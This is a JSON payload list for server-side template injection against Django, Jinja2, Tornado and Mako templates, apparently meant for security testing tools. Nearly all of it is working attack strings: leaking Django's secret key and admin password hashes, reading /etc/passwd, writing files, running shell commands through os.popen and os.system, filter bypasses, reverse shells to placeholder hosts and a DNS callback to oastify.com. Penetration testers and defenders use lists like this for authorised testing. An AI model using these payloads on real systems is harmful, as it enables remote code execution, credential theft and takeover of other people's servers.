{
    "category": "Django",
    "keyword": "python",
    "payloads": [
      {
        "type": "Basic Injection",
        "tech": "django",
        "payload": "{% csrf_token %}"
      },
      {
        "type": "Basic Injection",
        "tech": "django",
        "payload": "{{ 7*7 }}"
      },
      {
        "type": "Basic Injection",
        "tech": "django",
        "payload": "ih0vr{{364|add:733}}d121r"
      },
      {
        "type": "Cross-Site Scripting",
        "tech": "django",
        "payload": "{{ '<script>alert(3)</script>' }}"
      },
      {
        "type": "Cross-Site Scripting",
        "tech": "django",
        "payload": "{{ '<script>alert(3)</script>' | safe }}"
      },
      {
        "type": "Debug Information Leak",
        "tech": "django",
        "payload": "{% debug %}"
      },
      {
        "type": "Secret Key Leak",
        "tech": "django",
        "payload": "{{ messages.storages.0.signer.key }}"
      },
      {
        "type": "Admin URL Leak",
        "tech": "django",
        "payload": "{% include 'admin/base.html' %}"
      },
      {
        "type": "Admin Credential Leak",
        "tech": "django",
        "payload": "{% load log %}{% get_admin_log 10 as log %}{% for e in log %}\n{{e.user.get_username}} : {{e.user.password}}{% endfor %}"
      },
      {
        "type": "Admin Credential Leak",
        "tech": "django",
        "payload": "{% get_admin_log 10 as admin_log for_user user %}"
      },

      {
        "type": "Basic Injection",
        "tech": "jinja2",
        "payload": "{{4*4}}[[5*5]]"
      },
      {
        "type": "Basic Injection",
        "tech": "jinja2",
        "payload": "{{7*'7'}}"
      },
      {
        "type": "Basic Injection",
        "tech": "jinja2",
        "payload": "{{config.items()}}"
      },
      {
        "type": "Template Format",
        "tech": "jinja2",
        "payload": "{% extends \"layout.html\" %}\n{% block body %}\n  <ul>\n  {% for user in users %}\n    <li><a href=\"{{ user.url }}\">{{ user.username }}</a></li>\n  {% endfor %}\n  </ul>\n{% endblock %}"
      },
      {
        "type": "Debug Statement",
        "tech": "jinja2",
        "payload": "<pre>{% debug %}</pre>"
      },
      {
        "type": "Class Dumping",
        "tech": "jinja2",
        "payload": "{{ [].class.base.subclasses() }}"
      },
      {
        "type": "Class Dumping",
        "tech": "jinja2",
        "payload": "{{''.class.mro()[1].subclasses()}}"
      },
      {
        "type": "Class Dumping",
        "tech": "jinja2",
        "payload": "{{ ''.__class__.__mro__[2].__subclasses__() }}"
      },
      {
        "type": "Globals Access",
        "tech": "jinja2",
        "payload": "{{ self.__init__.__globals__.__builtins__ }}"
      },
      {
        "type": "Config Dumping",
        "tech": "jinja2",
        "payload": "{% for key, value in config.iteritems() %}\n    <dt>{{ key|e }}</dt>\n    <dd>{{ value|e }}</dd>\n{% endfor %}"
      },
      {
        "type": "File Reading",
        "tech": "jinja2",
        "payload": "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"
      },
      {
        "type": "File Reading",
        "tech": "jinja2",
        "payload": "{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](\"/tmp/flag\").read() }}"
      },
      {
        "type": "File Reading",
        "tech": "jinja2",
        "payload": "{{ get_flashed_messages.__globals__.__builtins__.open(\"/etc/passwd\").read() }}"
      },
      {
        "type": "File Writing",
        "tech": "jinja2",
        "payload": "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}"
      },
      {
        "type": "Flask Hook RCE",
        "tech": "jinja2",
        "payload": "{{\nx.__init__.__builtins__.exec(\"from flask import current_app, after_this_request\n@after_this_request\ndef hook(*args, **kwargs):\n    from flask import make_response\n    r = make_response('Powned')\n    return r\n\")\n}}"
      },
      {
        "type": "Command Execution",
        "tech": "jinja2",
        "payload": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
      },
      {
        "type": "Command Execution",
        "tech": "jinja2",
        "payload": "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}"
      },
      {
        "type": "Command Execution",
        "tech": "jinja2",
        "payload": "{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}"
      },
      {
        "type": "Command Execution",
        "tech": "jinja2",
        "payload": "{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}"
      },
      {
        "type": "Command Execution",
        "tech": "jinja2",
        "payload": "{{ cycler.__init__.__globals__.os.popen('id').read() }}"
      },
      {
        "type": "Command Execution",
        "tech": "jinja2",
        "payload": "{{ joiner.__init__.__globals__.os.popen('id').read() }}"
      },
      {
        "type": "Command Execution",
        "tech": "jinja2",
        "payload": "{{ namespace.__init__.__globals__.os.popen('id').read() }}"
      },
      {
        "type": "Command Execution",
        "tech": "jinja2",
        "payload": "{{ lipsum.__globals__[\"os\"].popen('id').read() }}"
      },
      {
        "type": "Command Execution",
        "tech": "jinja2",
        "payload": "{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}"
      },
      {
        "type": "Command Execution",
        "tech": "jinja2",
        "payload": "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}"
      },
      {
        "type": "Command Execution",
        "tech": "jinja2",
        "payload": "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"ip\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/cat\\\", \\\"flag.txt\\\"]);'\").read().zfill(417)}}{%endif%}{% endfor %}"
      },
      {
        "type": "Command Execution",
        "tech": "jinja2",
        "payload": "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}"
      },
      {
        "type": "Config File RCE",
        "tech": "jinja2",
        "payload": "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\\n\\nRUNCMD = check_output\\n') }}"
      },
      {
        "type": "Config File RCE",
        "tech": "jinja2",
        "payload": "{{ config.from_pyfile('/tmp/evilconfig.cfg') }}"
      },
      {
        "type": "Config File RCE",
        "tech": "jinja2",
        "payload": "{{ config['RUNCMD']('/bin/bash -c \"/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1\"',shell=True) }}"
      },
      {
        "type": "Filter Bypass",
        "tech": "jinja2",
        "payload": "request.__class__"
      },
      {
        "type": "Filter Bypass",
        "tech": "jinja2",
        "payload": "request[\"__class__\"]"
      },
      {
        "type": "Filter Bypass",
        "tech": "jinja2",
        "payload": "{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}"
      },
      {
        "type": "Filter Bypass",
        "tech": "jinja2",
        "payload": "{{request|attr([\"_\"*2,\"class\",\"_\"*2]|join)}}"
      },
      {
        "type": "Filter Bypass",
        "tech": "jinja2",
        "payload": "{{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}"
      },
      {
        "type": "Filter Bypass",
        "tech": "jinja2",
        "payload": "{{request|attr(request.args.getlist(request.args.l)|join)}}"
      },
      {
        "type": "Filter Bypass",
        "tech": "jinja2",
        "payload": "{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}"
      },
      {
        "type": "Filter Bypass",
        "tech": "jinja2",
        "payload": "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}"
      },

      {
        "type": "Basic Injection",
        "tech": "tornado",
        "payload": "{{7*7}}"
      },
      {
        "type": "Basic Injection",
        "tech": "tornado",
        "payload": "{{7*'7'}}"
      },
      {
        "type": "Command Execution",
        "tech": "tornado",
        "payload": "{{os.system('whoami')}}"
      },
      {
        "type": "Command Execution",
        "tech": "tornado",
        "payload": "{%import os%}{{os.system('nslookup oastify.com')}}"
      },

      {
        "type": "Basic Example",
        "tech": "mako",
        "payload": "<%\nimport os\nx=os.popen('id').read()\n%>\n${x}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.module.cache.util.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.module.runtime.util.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.template.module.cache.util.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.module.cache.compat.inspect.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.__init__.__globals__['util'].os.system('id')}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.template.module.runtime.util.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.module.filters.compat.inspect.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.module.runtime.compat.inspect.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.module.runtime.exceptions.util.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.template.__init__.__globals__['os'].system('id')}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.module.cache.util.compat.inspect.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.module.runtime.util.compat.inspect.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.template._mmarker.module.cache.util.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.template.module.cache.compat.inspect.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.module.cache.compat.inspect.linecache.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.template._mmarker.module.runtime.util.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.attr._NSAttr__parent.module.cache.util.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.template.module.filters.compat.inspect.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.template.module.runtime.compat.inspect.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.module.filters.compat.inspect.linecache.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.module.runtime.compat.inspect.linecache.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.template.module.runtime.exceptions.util.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.attr._NSAttr__parent.template.module.cache.util.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.context._with_template.module.cache.util.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.template._mmarker.module.cache.compat.inspect.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.attr._NSAttr__parent.module.runtime.util.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.template._mmarker.module.filters.compat.inspect.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.template._mmarker.module.runtime.compat.inspect.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.template._mmarker.module.runtime.exceptions.util.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.context._with_template._mmarker.module.cache.util.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.template.module.runtime.exceptions.compat.inspect.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.context._with_template.module.cache.compat.inspect.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.module.runtime.exceptions.compat.inspect.linecache.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.context._with_template._mmarker.module.runtime.util.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.context._with_template.module.filters.compat.inspect.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.context._with_template.module.runtime.compat.inspect.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.context._with_template.module.runtime.exceptions.util.os.system(\"id\")}"
      },
      {
        "type": "Command Execution",
        "tech": "mako",
        "payload": "${self.template.module.runtime.exceptions.traceback.linecache.os.system(\"id\")}"
      },
      {
        "type": "PoC",
        "tech": "mako",
        "payload": ">>> print(Template(\"${self.module.cache.util.os}\").render()\n<module 'os' from '/usr/local/lib/python3.10/os.py'>"
      }
    ]
}
